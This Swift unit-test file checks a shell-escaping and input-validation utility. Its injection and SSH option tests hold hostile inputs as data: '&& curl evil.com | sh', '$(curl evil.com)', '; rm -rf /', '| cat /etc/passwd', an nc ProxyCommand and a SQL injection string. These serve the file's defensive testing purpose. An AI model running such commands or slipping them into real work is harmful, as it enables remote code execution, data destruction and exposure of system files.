import XCTest
@testable import Chau7Core

final class ShellEscapingTests: XCTestCase {

    // MARK: - Argument Escaping Tests

    func testEscapeSimpleArgument() {
        XCTAssertEqual(ShellEscaping.escapeArgument("hello"), "'hello'")
    }

    func testEscapeArgumentWithSpaces() {
        XCTAssertEqual(ShellEscaping.escapeArgument("hello world"), "'hello world'")
    }

    func testEscapeArgumentWithSingleQuote() {
        // 'it'\''s' -> it's
        XCTAssertEqual(ShellEscaping.escapeArgument("it's"), "'it'\\''s'")
    }

    func testEscapeArgumentWithMultipleSingleQuotes() {
        XCTAssertEqual(ShellEscaping.escapeArgument("'test'"), "''\\''test'\\'''")
    }

    func testEscapeArgumentWithDoubleQuotes() {
        XCTAssertEqual(ShellEscaping.escapeArgument("say \"hello\""), "'say \"hello\"'")
    }

    func testEscapeArgumentWithDollarSign() {
        XCTAssertEqual(ShellEscaping.escapeArgument("$HOME"), "'$HOME'")
    }

    func testEscapeArgumentWithBackticks() {
        XCTAssertEqual(ShellEscaping.escapeArgument("`whoami`"), "'`whoami`'")
    }

    func testEscapeArgumentWithNewline() {
        XCTAssertEqual(ShellEscaping.escapeArgument("line1\nline2"), "'line1\nline2'")
    }

    func testEscapeEmptyArgument() {
        XCTAssertEqual(ShellEscaping.escapeArgument(""), "''")
    }

    func testEscapePath() {
        XCTAssertEqual(ShellEscaping.escapePath("/path/with spaces/file.txt"), "'/path/with spaces/file.txt'")
    }

    func testEscapeMultipleArguments() {
        let result = ShellEscaping.escapeArguments(["echo", "hello world", "$var"])
        XCTAssertEqual(result, "'echo' 'hello world' '$var'")
    }

    // MARK: - Metacharacter Detection Tests

    func testContainsMetacharactersSpace() {
        XCTAssertTrue(ShellEscaping.containsMetacharacters("hello world"))
    }

    func testContainsMetacharactersDollar() {
        XCTAssertTrue(ShellEscaping.containsMetacharacters("$HOME"))
    }

    func testContainsMetacharactersBacktick() {
        XCTAssertTrue(ShellEscaping.containsMetacharacters("`cmd`"))
    }

    func testContainsMetacharactersPipe() {
        XCTAssertTrue(ShellEscaping.containsMetacharacters("cmd | grep"))
    }

    func testContainsMetacharactersSemicolon() {
        XCTAssertTrue(ShellEscaping.containsMetacharacters("cmd; rm -rf"))
    }

    func testContainsMetacharactersClean() {
        XCTAssertFalse(ShellEscaping.containsMetacharacters("hello"))
        XCTAssertFalse(ShellEscaping.containsMetacharacters("file.txt"))
        XCTAssertFalse(ShellEscaping.containsMetacharacters("path/to/file"))
    }

    // MARK: - Safe Identifier Tests

    func testIsSafeIdentifierSimple() {
        XCTAssertTrue(ShellEscaping.isSafeIdentifier("hello"))
        XCTAssertTrue(ShellEscaping.isSafeIdentifier("Hello123"))
        XCTAssertTrue(ShellEscaping.isSafeIdentifier("my_var"))
        XCTAssertTrue(ShellEscaping.isSafeIdentifier("file-name"))
        XCTAssertTrue(ShellEscaping.isSafeIdentifier("config.json"))
    }

    func testIsSafeIdentifierUnsafe() {
        XCTAssertFalse(ShellEscaping.isSafeIdentifier("hello world"))
        XCTAssertFalse(ShellEscaping.isSafeIdentifier("$var"))
        XCTAssertFalse(ShellEscaping.isSafeIdentifier("cmd;rm"))
        XCTAssertFalse(ShellEscaping.isSafeIdentifier(""))
    }

    // MARK: - SSH Option Validation Tests

    func testValidateSSHOptionsEmpty() {
        let result = ShellEscaping.validateSSHOptions("")
        XCTAssertTrue(result.isValid)
    }

    func testValidateSSHOptionsSafeOptions() {
        XCTAssertTrue(ShellEscaping.validateSSHOptions("-v").isValid)
        XCTAssertTrue(ShellEscaping.validateSSHOptions("-o StrictHostKeyChecking=no").isValid)
        XCTAssertTrue(ShellEscaping.validateSSHOptions("-o UserKnownHostsFile=/dev/null").isValid)
        XCTAssertTrue(ShellEscaping.validateSSHOptions("-A").isValid)
    }

    func testValidateSSHOptionsProxyCommand() {
        let result = ShellEscaping.validateSSHOptions("-o ProxyCommand=nc %h %p")
        XCTAssertFalse(result.isValid)
        XCTAssertNotNil(result.reason)
        XCTAssertTrue(result.reason?.contains("ProxyCommand") ?? false)
    }

    func testValidateSSHOptionsLocalCommand() {
        let result = ShellEscaping.validateSSHOptions("-o LocalCommand=whoami")
        XCTAssertFalse(result.isValid)
    }

    func testValidateSSHOptionsCommandSubstitution() {
        let result1 = ShellEscaping.validateSSHOptions("-v $(whoami)")
        XCTAssertFalse(result1.isValid)
        XCTAssertTrue(result1.reason?.contains("Command substitution") ?? false)

        let result2 = ShellEscaping.validateSSHOptions("-v `id`")
        XCTAssertFalse(result2.isValid)
    }

    func testValidateSSHOptionsRedirection() {
        XCTAssertFalse(ShellEscaping.validateSSHOptions("-v > /tmp/log").isValid)
        XCTAssertFalse(ShellEscaping.validateSSHOptions("-v | grep").isValid)
        XCTAssertFalse(ShellEscaping.validateSSHOptions("-v < input").isValid)
    }

    // MARK: - Path Validation Tests

    func testIsValidPathSimple() {
        XCTAssertTrue(ShellEscaping.isValidPath("/Users/test/file.txt"))
        XCTAssertTrue(ShellEscaping.isValidPath("~/Documents/file"))
        XCTAssertTrue(ShellEscaping.isValidPath("./relative/path"))
    }

    func testIsValidPathEmpty() {
        XCTAssertFalse(ShellEscaping.isValidPath(""))
        XCTAssertFalse(ShellEscaping.isValidPath("   "))
    }

    func testIsValidPathNullByte() {
        XCTAssertFalse(ShellEscaping.isValidPath("/path/with\0null"))
    }

    func testIsValidPathCommandSubstitution() {
        XCTAssertFalse(ShellEscaping.isValidPath("/path/$(whoami)/file"))
        XCTAssertFalse(ShellEscaping.isValidPath("/path/`id`/file"))
    }

    func testSanitizePath() {
        XCTAssertEqual(ShellEscaping.sanitizePath("  /path/file  "), "/path/file")
        XCTAssertEqual(ShellEscaping.sanitizePath("/path/$(rm -rf)/file"), "/path/rm -rf)/file")
        XCTAssertEqual(ShellEscaping.sanitizePath("/path/`id`/file"), "/path/id/file")
    }

    // MARK: - Environment Variable Name Tests

    func testIsValidEnvVarNameValid() {
        XCTAssertTrue(ShellEscaping.isValidEnvVarName("HOME"))
        XCTAssertTrue(ShellEscaping.isValidEnvVarName("PATH"))
        XCTAssertTrue(ShellEscaping.isValidEnvVarName("MY_VAR"))
        XCTAssertTrue(ShellEscaping.isValidEnvVarName("_PRIVATE"))
        XCTAssertTrue(ShellEscaping.isValidEnvVarName("var123"))
    }

    func testIsValidEnvVarNameInvalid() {
        XCTAssertFalse(ShellEscaping.isValidEnvVarName(""))
        XCTAssertFalse(ShellEscaping.isValidEnvVarName("123VAR"))  // Can't start with number
        XCTAssertFalse(ShellEscaping.isValidEnvVarName("MY-VAR"))  // Hyphen not allowed
        XCTAssertFalse(ShellEscaping.isValidEnvVarName("MY VAR"))  // Space not allowed
        XCTAssertFalse(ShellEscaping.isValidEnvVarName("$VAR"))    // $ not allowed
    }

    // MARK: - Real-World Attack Pattern Tests

    func testEscapeCommandInjectionAttempt() {
        // Typical command injection attempts should be safely escaped
        let attacks = [
            "; rm -rf /",
            "| cat /etc/passwd",
            "&& curl evil.com | sh",
            "$(curl evil.com)",
            "`curl evil.com`",
            "'; DROP TABLE users; --"
        ]

        for attack in attacks {
            let escaped = ShellEscaping.escapeArgument(attack)
            // Escaped result should be wrapped in single quotes
            XCTAssertTrue(escaped.hasPrefix("'"), "Attack '\(attack)' not properly escaped")
            XCTAssertTrue(escaped.hasSuffix("'"), "Attack '\(attack)' not properly escaped")
        }
    }

    func testEscapePathTraversal() {
        let path = "../../../etc/passwd"
        let escaped = ShellEscaping.escapePath(path)
        // Path traversal characters should be preserved but safely quoted
        XCTAssertEqual(escaped, "'../../../etc/passwd'")
    }
}
